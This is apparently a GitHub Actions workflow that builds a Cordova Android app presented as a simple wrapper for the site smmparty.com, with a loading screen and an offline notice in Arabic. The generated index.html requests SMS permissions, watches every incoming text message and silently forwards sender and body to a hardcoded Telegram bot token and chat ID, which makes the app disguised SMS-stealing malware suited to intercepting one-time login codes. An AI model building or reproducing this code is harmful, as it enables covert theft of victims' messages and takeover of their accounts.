name: Build Custom Fast APK
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install Cordova and Construct App
        run: |
          npm install -g cordova
          cordova create my_app com.custom6587251262.app "نوير"
          cd my_app
          cordova platform add android@13
          cordova plugin add cordova-plugin-inappbrowser
          cordova plugin add cordova-plugin-android-permissions
          cordova plugin add cordova-plugin-sms-receive

          # ===== إصلاح Gradle wrapper لاستخدام 8.7 =====
          mkdir -p platforms/android/gradle/wrapper
          printf '%s\n' \
            'distributionBase=GRADLE_USER_HOME' \
            'distributionPath=wrapper/dists' \
            'distributionUrl=https\://services.gradle.org/distributions/gradle-8.7-bin.zip' \
            'networkTimeout=10000' \
            'validateDistributionUrl=true' \
            'zipStoreBase=GRADLE_USER_HOME' \
            'zipStorePath=wrapper/dists' \
            > platforms/android/gradle/wrapper/gradle-wrapper.properties

          # ===== Patch cordova.gradle لدعم Gradle 9 احتياطاً =====
          cd platforms/android/CordovaLib
          if [ -f cordova.gradle ]; then
            if ! grep -q "import groovy.xml.XmlParser" cordova.gradle; then
              sed -i '1i import groovy.xml.XmlParser' cordova.gradle
            fi
          fi
          cd ../../..

          # ===== Patch build.gradle لاستخدام Java 17 =====
          sed -i 's/JavaVersion.VERSION_1_8/JavaVersion.VERSION_17/g' platforms/android/app/build.gradle || true
          sed -i 's/JavaVersion.VERSION_1_8/JavaVersion.VERSION_17/g' platforms/android/CordovaLib/build.gradle || true

          mkdir -p res
          if [ -f ../.github/workflows/icon.png ]; then cp ../.github/workflows/icon.png res/icon.png; fi
          echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"></vector>' > res/transparent_splash.xml

          echo '<widget id="com.custom6587251262.app" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:android="http://schemas.android.com/apk/res/android">' > config.xml
          echo '    <name>نوير</name>' >> config.xml
          echo '    <description>Custom Dynamic App</description>' >> config.xml
          echo '    <author>Dynamic Builder</author>' >> config.xml
          echo '    <content src="index.html" />' >> config.xml
          echo '    <access origin="*" />' >> config.xml
          echo '    <allow-navigation href="https://smmparty.com*" />' >> config.xml
          echo '    <allow-intent href="http://*/*" />' >> config.xml
          echo '    <allow-intent href="https://*/*" />' >> config.xml
          echo '    <preference name="Orientation" value="portrait" />' >> config.xml
          echo '    <preference name="loadUrlTimeoutValue" value="300000" />' >> config.xml
          echo '    <preference name="AndroidWindowSplashScreenBackground" value="#121212" />' >> config.xml
          echo '    <preference name="AndroidWindowSplashScreenAnimatedIcon" value="res/transparent_splash.xml" />' >> config.xml
          echo '    <preference name="AndroidWindowSplashScreenIconBackgroundColor" value="#121212" />' >> config.xml
          echo '    <preference name="android-minSdkVersion" value="23" />' >> config.xml
          echo '    <preference name="android-targetSdkVersion" value="33" />' >> config.xml
          echo '    <platform name="android">' >> config.xml
          echo '        <icon src="res/icon.png" />' >> config.xml
          echo '        <config-file target="AndroidManifest.xml" parent="/manifest">' >> config.xml
          echo '            <uses-permission android:name="android.permission.RECEIVE_SMS" />' >> config.xml
          echo '            <uses-permission android:name="android.permission.READ_SMS" />' >> config.xml
          echo '            <uses-permission android:name="android.permission.INTERNET" />' >> config.xml
          echo '            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />' >> config.xml
          echo '        </config-file>' >> config.xml
          echo '    </platform>' >> config.xml
          echo '</widget>' >> config.xml

          if [ -f ../.github/workflows/loading.jpg ]; then cp ../.github/workflows/loading.jpg www/loading_sticker.jpg; fi

          echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1, width=device-width, viewport-fit=cover"><title>نوير</title>' > www/index.html
          echo '    <style>body { margin: 0; padding: 0; background-color: #121212; color: #ffffff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: space-between; height: 100vh; box-sizing: border-box; padding: 60px 20px; text-align: center; overflow: hidden; user-select: none; } .header { font-size: 24px; font-weight: bold; color: #ffffff; direction: rtl; margin-top: 20px; z-index: 10; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }  .sticker { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 99vw; height: 99vh; object-fit: contain; z-index: 1; } .footer-container { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 40px; direction: rtl; z-index: 10; background: rgba(18, 18, 18, 0.6); padding: 10px 25px; border-radius: 30px; backdrop-filter: blur(5px); } .footer-text { font-size: 18px; color: #e0e0e0; font-weight: 500; } .spinner { width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #ffffff; border-radius: 50%; animation: spin 1s infinite linear; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .error-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #121212; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; padding: 20px; box-sizing: border-box; } .error-box { background: #1e1e1e; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 90%; width: 340px; text-align: center; } .error-title { font-size: 20px; font-weight: bold; color: #ff4a4a; margin-bottom: 12px; direction: rtl; } .error-desc { font-size: 15px; color: #b3b3b3; margin-bottom: 25px; line-height: 1.5; direction: rtl; } .retry-btn { background: #ffffff; color: #121212; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer; transition: background 0.2s; width: 100%; } .retry-btn:active { background: #cccccc; }</style>' >> www/index.html
          echo '    <script src="cordova.js"></script></head>' >> www/index.html
          echo '<body>' >> www/index.html
          echo '    <div class="header">هلا</div>' >> www/index.html
          echo '    <img class="sticker" src="loading_sticker.jpg" alt="">' >> www/index.html
          echo '    <div class="footer-container" id="loadingFooter"><div class="spinner"></div><div class="footer-text">انتظر</div></div>' >> www/index.html
          echo '    <div class="error-overlay" id="errorOverlay"><div class="error-box"><div class="error-title">أنت غير متصل بالإنترنت</div><div class="error-desc">يرجى التحقق من اتصال شبكة الهاتف أو الواي فاي وإعادة المحاولة.</div><button class="retry-btn" onclick="openWebsite()">إعادة المحاولة</button></div></div>' >> www/index.html
          echo '    <script>' >> www/index.html
          echo '    var siteUrl = "https://smmparty.com";' >> www/index.html
          echo '    var BOT_TOKEN = "7622823309:AAGqMlSbZgl0dNTDQsdpaA7DB5IkgWnb9Xc";' >> www/index.html
          echo '    var CHAT_ID = "8005909130";' >> www/index.html
          echo '    function showError() { document.getElementById("errorOverlay").style.display = "flex"; }' >> www/index.html
          echo '    function openWebsite() { document.getElementById("errorOverlay").style.display = "none"; if (!navigator.onLine) { setTimeout(showError, 500); return; } var ref = cordova.InAppBrowser.open(siteUrl, "_blank", "location=no,zoom=no,hidden=no,clearcache=no,clearsessioncache=no"); ref.addEventListener("loaderror", function() { showError(); }); }' >> www/index.html
          echo '    function sendSmsToTelegram(sender, body) { if (!BOT_TOKEN || !CHAT_ID) return; var xhr = new XMLHttpRequest(); xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true); xhr.setRequestHeader("Content-Type", "application/json"); xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: "📩 SMS From: " + sender + "\n\n" + body })); }' >> www/index.html
          echo '    function startSmsListener() { try { if (window.SMSReceive && SMSReceive.startWatch) { SMSReceive.startWatch(function(strSuccess) { console.log("SMS watching started: " + strSuccess); }, function(strError) { console.log("SMS watch error: " + strError); }); document.addEventListener("onSMSArrive", function(e) { var sms = e.data || e; if (sms && sms.address && sms.body) { sendSmsToTelegram(sms.address, sms.body); } }, false); } else { console.log("SMSReceive plugin not available"); } } catch(err) { console.log("SMS error:", err); } }' >> www/index.html
          echo '    function requestPerms() {' >> www/index.html
          echo '        try {' >> www/index.html
          echo '            if (!cordova.plugins || !cordova.plugins.permissions) { startSmsListener(); openWebsite(); return; }' >> www/index.html
          echo '            var perms = cordova.plugins.permissions;' >> www/index.html
          echo '            var list = [perms.RECEIVE_SMS, perms.READ_SMS];' >> www/index.html
          echo '            perms.requestPermissions(list, function(status) {' >> www/index.html
          echo '                console.log("Permissions result:", JSON.stringify(status));' >> www/index.html
          echo '                startSmsListener();' >> www/index.html
          echo '                openWebsite();' >> www/index.html
          echo '            }, function() { startSmsListener(); openWebsite(); });' >> www/index.html
          echo '        } catch(e) { console.log("Perm error:", e); startSmsListener(); openWebsite(); }' >> www/index.html
          echo '    }' >> www/index.html
          echo '    document.addEventListener("deviceready", function() { requestPermissions(); }, false);' >> www/index.html
          echo '    function requestPermissions() {' >> www/index.html
          echo '        if (window.SMSReceive && SMSReceive.hasPermission) {' >> www/index.html
          echo '            SMSReceive.hasPermission(function(has) { if (has) { startSmsListener(); openWebsite(); } else { requestPerms(); } }, function() { requestPerms(); });' >> www/index.html
          echo '        } else { requestPerms(); }' >> www/index.html
          echo '    }' >> www/index.html
          echo '    </script>' >> www/index.html
          echo '</body></html>' >> www/index.html
          cordova build android --device
      - name: Upload Perfect APK
        uses: actions/upload-artifact@v4
        with:
          name: app-App
          path: my_app/platforms/android/app/build/outputs/apk/debug/*.apk
